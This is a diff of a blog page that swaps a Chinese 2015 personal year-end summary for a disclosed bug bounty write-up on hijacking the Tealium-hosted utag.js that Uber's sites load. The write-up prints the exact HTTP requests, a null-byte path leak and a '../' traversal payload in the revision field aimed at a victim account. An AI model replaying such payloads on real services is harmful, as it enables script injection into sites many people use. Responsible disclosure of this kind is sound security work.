@@ -66,7 +66,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Life," />
+  <meta name="keywords" content="安全,BBP," />
 
 
 
@@ -84,18 +84,20 @@
 
 
 
-<meta name="description" content="又是一年要结束了，又到了该总结一下过去一年的收获，也许明天会更好吧。妈蛋，原来去年没有写总结，怪不得觉得有很多事情要写，但时间都对不上。 Timeline 2月份在家过完年很早就回到学校，完成一件很久之前一直要做但没敢去做的事情 3，4，5月调整心情，在学校写毕业设计，5月份答辩完 6月份毕业啦，在中大六年的生活就此落幕 7月份开始工作了，人生开始变化，而我却还是那个我，波澜不惊的生活 10月份开">
-<meta name="keywords" content="Life">
+<meta name="description" content="Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly. TLDR Almost all of Uber’s websites are loading JS file: https://tags.tiqcdn.com/utag">
+<meta name="keywords" content="安全,BBP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2015的无聊总结">
-<meta property="og:url" content="http://zhchbin.github.io/2015/12/26/2015-summary/index.html">
+<meta property="og:title" content="[BBP系列三] Hijack the JS File of Uber&#39;s Website">
+<meta property="og:url" content="http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description" content="又是一年要结束了，又到了该总结一下过去一年的收获，也许明天会更好吧。妈蛋，原来去年没有写总结，怪不得觉得有很多事情要写，但时间都对不上。 Timeline 2月份在家过完年很早就回到学校，完成一件很久之前一直要做但没敢去做的事情 3，4，5月调整心情，在学校写毕业设计，5月份答辩完 6月份毕业啦，在中大六年的生活就此落幕 7月份开始工作了，人生开始变化，而我却还是那个我，波澜不惊的生活 10月份开">
+<meta property="og:description" content="Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly. TLDR Almost all of Uber’s websites are loading JS file: https://tags.tiqcdn.com/utag">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2016-10-02T05:43:40.000Z">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg">
+<meta property="og:updated_time" content="2018-12-03T05:59:57.221Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2015的无聊总结">
-<meta name="twitter:description" content="又是一年要结束了，又到了该总结一下过去一年的收获，也许明天会更好吧。妈蛋，原来去年没有写总结，怪不得觉得有很多事情要写，但时间都对不上。 Timeline 2月份在家过完年很早就回到学校，完成一件很久之前一直要做但没敢去做的事情 3，4，5月调整心情，在学校写毕业设计，5月份答辩完 6月份毕业啦，在中大六年的生活就此落幕 7月份开始工作了，人生开始变化，而我却还是那个我，波澜不惊的生活 10月份开">
+<meta name="twitter:title" content="[BBP系列三] Hijack the JS File of Uber&#39;s Website">
+<meta name="twitter:description" content="Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly. TLDR Almost all of Uber’s websites are loading JS file: https://tags.tiqcdn.com/utag">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg">
 
 
 
@@ -116,9 +118,9 @@
 
 
 
-  <link rel="canonical" href="http://zhchbin.github.io/2015/12/26/2015-summary/"/>
+  <link rel="canonical" href="http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/"/>
 
-  <title> 2015的无聊总结 | zhchbin </title>
+  <title> [BBP系列三] Hijack the JS File of Uber's Website | zhchbin </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -258,7 +260,7 @@
             
             
               
-                2015的无聊总结
+                [BBP系列三] Hijack the JS File of Uber's Website
               
             
           </h1>
@@ -270,8 +272,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-12-26T19:12:31+08:00" content="2015-12-26">
-              2015-12-26
+            <time itemprop="dateCreated" datetime="2018-12-03T13:11:08+08:00" content="2018-12-03">
+              2018-12-03
             </time>
           </span>
 
@@ -281,8 +283,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2015/12/26/2015-summary/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/12/26/2015-summary/" itemprop="commentsCount"></span>
+                <a href="/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -310,28 +312,29 @@
       
 
       
-        <p>又是一年要结束了，又到了该总结一下过去一年的收获，也许明天会更好吧。妈蛋，原来去年没有写总结，怪不得觉得有很多事情要写，但时间都对不上。</p>
-<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul>
-<li>2月份在家过完年很早就回到学校，完成一件很久之前一直要做但没敢去做的事情</li>
-<li>3，4，5月调整心情，在学校写毕业设计，5月份答辩完</li>
-<li>6月份毕业啦，在中大六年的生活就此落幕</li>
-<li>7月份开始工作了，人生开始变化，而我却还是那个我，波澜不惊的生活</li>
-<li>10月份开始培养业务爱好，除去美剧，日漫后另一个可以用来消磨时间的事情</li>
+        <p>Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly.</p>
+<h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ol>
+<li>Almost all of Uber’s websites are loading JS file: <a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.js" target="_blank" rel="noopener">https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</a> </li>
+<li>I found that the content of utag.js is updating from <code>/data/utui/data/accounts/uber/templates/main/utag.js</code> when deploying in my.tealiumiq.com. </li>
+<li>my.tealiumiq.com has a path traversal issue, which allow hacker to change <code>utag.js</code> of other account, including Uber’s.</li>
+<li>This bug had beed fixed 8 months ago. Bug Bounty: $6000.</li>
+</ol>
+<h3 id="My-Steps"><a href="#My-Steps" class="headerlink" title="My Steps"></a>My Steps</h3><p>I like asking myself some questions when hunting for bug bounty. Looking around about <code>https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</code>, I found Uber’s websites were using a third party service offered by <code>Tealium</code>. I asked myself: can I modify the content of <code>utag.js</code>? How?</p>
+<p>I registered two account and began my journey. WARNING: DO NOT TEST IN PRODUCTION USING TARGET ACCOUNT.</p>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg" alt=""></p>
+<ul>
+<li>Post <code>/urest/legacy/saveTemplate</code> with <code>profile=main%00</code> to get the path in server</li>
 </ul>
-<h3 id="毕业设计和毕业典礼"><a href="#毕业设计和毕业典礼" class="headerlink" title="毕业设计和毕业典礼"></a>毕业设计和毕业典礼</h3><p>我用心做了吗？没有。我用心写了吗？没有。毕设题目我现在好像已经快忘记得差不多，当时盲审的时候出来的结果居然有个B，被打回来修改后找导师签名才能过的那种，周围人都是一次性过，还好当时心态摆得比较平，只要不是不通过，我改就是了。后来当然就是答辩了，还算顺利，我被安排在下午。老师们估计也是听着觉得没意思，随便问了几个问题就过去了。早上在那里等了一个上午，结果轮到自己估计15分钟都不用就完事了，中间还没有去吃饭一直在那里准备！印象最深的是结束答辩后朋友圈刷起了“今天是个好日子”的歌！！哈哈！毕业设计算是给自己两年研究生生活的交代吧，虽然事后觉得很少，但是事前周围大家都渲染了恐怖的气氛，压力多少还是有一些的。</p>
-<p>完成毕业设计之后迎来的当然是估计这辈子都不会再有的猪一样的生活了，那段时间可以无忧无虑地在校园里享受最后的大学时光，每天想去打球就去打球，一周估计有三次吧！当然后果就是：在越来越黑的路上越走越远啊。打完球一身汗坐在篮球场上仰望星空，等待一切该发生的事情。学院毕业那天随便过去拍拍照就完了，感觉天太热叫朋友来一起拍照太麻烦，我还是选择跟本科毕业一样低调了事。学院请吃饭那晚也没记得什么，心态变得很平淡，估计是老了吧。学校毕业典礼那天跟校长握了一下手，没有做什么突出的事情，也安安静静地结束了。</p>
-<h3 id="关于工作"><a href="#关于工作" class="headerlink" title="关于工作"></a>关于工作</h3><p>华丽丽地从一个学生仔变成社会人士，很庆幸的是我们这一行的圈子不需要太多的转变，最大的变化无非就是以前待在实验室，现在要每天待到办公室里面对电脑屏幕敲键盘。还有就是不能再任性的想几点起床就几点起床，晚上睡觉都要多告诉自己一声明天要上班，每逢周一心情会跟大家一样Down，周五下班有种释然的感觉。工作算轻松的吧，压力不大，部门还有一堆喜欢运动的同事，每周可以打球。唯一觉得该提的一件事就是新人转正的一个必要条件，在某个打字软件上速度要达到60。好吧，每天上班前练习40分钟到一个小时，中午休息的时候练一个小时，晚上下班后在公司练一个小时，回来后在自己电脑上再练多一会，最后总算有惊无险地通过。</p>
-<h3 id="这一年的业余爱好"><a href="#这一年的业余爱好" class="headerlink" title="这一年的业余爱好"></a>这一年的业余爱好</h3><ol>
-<li>看NBA，印象深刻的是雷霆最后进不了季后赛，感叹了一声：当你的命运掌握在别人的手里，再努力也没用。另外一个就是支持的球队金州勇士最后拿下了总冠军！以后有机会一定要去现场看一次NBA的比赛！</li>
-<li>追剧，小说，电影等。这一年追的美剧不少啊，苦逼的IT创业者之《硅谷》，民风淳朴的《哥谭》，各种奇怪能力的《神盾局特工》，每集都高潮迭起的《逍遥法外》，最喜欢的当数《黑客军团》，至今仍然印象深刻的对白：”You cry sometimes… Just like me. Because you are lonely. I don’t just hack you, Krista. I hack everyone – My friends, coworkers. But I’ve helped a lot of people. I want … A way out of loneliness… Just like you.”。我还记得看了《一公升的眼泪》，是的，每集都会流一公升的眼泪。对了，每晚睡觉前我还拿起了当年买的kindle看小说，看完了《肖申克的救赎》，半本《盗墓笔记》，《三体》，《三体II：黑暗森林》等。还追了一些日漫，有点多就不一一列举。当然，我学习也没有落下的，浏览完了几本技术书，也偶尔更新下博客。</li>
-<li>业务安全爱好者，从10月份起就在漏洞平台乌云上提交一些漏洞，等级从一个路人刷到了白帽子。黑客？我当然是个好人，引用别人一句话：“我提交漏洞，大多为了名利和自我价值实现，这些已让我有足够动机，不掺杂任何崇高的白帽子精神。”</li>
-</ol>
-<h3 id="值得吹牛的事情"><a href="#值得吹牛的事情" class="headerlink" title="值得吹牛的事情"></a>值得吹牛的事情</h3><ol>
-<li>给一个公司报告了一个他们软件上某个功能的Bug，得到了1000刀的奖励。钱虽然不多，但发现我的邮件里只写了几十个字，大概知识就是财富吧，哈哈。</li>
-<li>来自陌生人的红包：前段时间有上海某公司的一个人加我，发了我个200RMB的红包，另外还有一个北京某教育类创业公司CTO也加我微信给我发了66 RMB的红包。</li>
-</ol>
-<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>明显这一年过得挺奇怪的，送给自己一句话，希望明年有所改变：生于忧患死于安乐。</p>
-
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=044925f62222711fdfec11dc6a4e7160e053d31e1a7f4774e8</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: my.tealiumiq.com</span><br><span class="line">&lt;redated&gt;</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=profile&amp;template=profile.loader&amp;code=%2F%2F+console.log(1)%3B%0A%0Aconsole.log(1)%3B</span><br></pre></td></tr></table></figure>
+<p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>As you can see, the <code>utag.loader</code> template path is <code>/data/utui/data/accounts/evilaccount/templates/main/utag.js</code></p>
+<ul>
+<li>Change the requst body to update the revision.loader</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230</span><br></pre></td></tr></table></figure>
+<p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>As you can see <code>201804081230</code> is appearing at the path. After testing, I found that I can insert <code>../</code> into this path, which means that I can change utag.js of any account, including Uber’s.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230/../../../../&lt;victimaccount&gt;/templates/main</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -353,7 +356,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Life/" rel="tag">#Life</a>
+            <a href="/tags/安全/" rel="tag">#安全</a>
+          
+            <a href="/tags/BBP/" rel="tag">#BBP</a>
           
         </div>
       
@@ -362,17 +367,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/12/05/how-do-your-websites-get-hacked/" rel="next" title="你的网站是怎么被黑的">
-                <i class="fa fa-chevron-left"></i> 你的网站是怎么被黑的
+              <a href="/2017/08/30/Uber-XSS-via-Cookie/" rel="next" title="[BBP系列二] Uber XSS via Cookie">
+                <i class="fa fa-chevron-left"></i> [BBP系列二] Uber XSS via Cookie
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/01/31/CRLF-Injection-and-Bypass-WAF/" rel="prev" title="CRLF Injection and Bypass Tencent WAF">
-                CRLF Injection and Bypass Tencent WAF <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -552,7 +553,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Timeline"><span class="nav-number">1.</span> <span class="nav-text">Timeline</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#毕业设计和毕业典礼"><span class="nav-number">1.1.</span> <span class="nav-text">毕业设计和毕业典礼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于工作"><span class="nav-number">1.2.</span> <span class="nav-text">关于工作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#这一年的业余爱好"><span class="nav-number">1.3.</span> <span class="nav-text">这一年的业余爱好</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#值得吹牛的事情"><span class="nav-number">1.4.</span> <span class="nav-text">值得吹牛的事情</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#最后"><span class="nav-number">1.5.</span> <span class="nav-text">最后</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#TLDR"><span class="nav-number">1.</span> <span class="nav-text">TLDR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#My-Steps"><span class="nav-number">2.</span> <span class="nav-text">My Steps</span></a></li></ol></div>
             
           </div>
         </section>
@@ -710,9 +711,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = 'zhchbin';
-      var disqus_identifier = '2015/12/26/2015-summary/';
-      var disqus_title = "2015的无聊总结";
-      var disqus_url = 'http://zhchbin.github.io/2015/12/26/2015-summary/';
+      var disqus_identifier = '2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/';
+      var disqus_title = "[BBP系列三] Hijack the JS File of Uber\'s Website";
+      var disqus_url = 'http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
